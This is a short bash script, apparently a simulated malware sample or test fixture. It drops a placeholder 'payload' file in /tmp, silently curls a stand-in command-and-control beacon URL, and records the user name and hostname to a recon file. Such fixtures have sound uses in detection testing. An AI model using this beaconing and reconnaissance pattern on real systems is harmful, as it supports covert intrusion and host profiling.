#!/bin/bash
echo "payload data" > /tmp/dropped_payload.txt
curl -s http://malware-c2.evil.test/beacon 2>/dev/null || true
whoami > /tmp/recon.txt
cat /etc/hostname >> /tmp/recon.txt
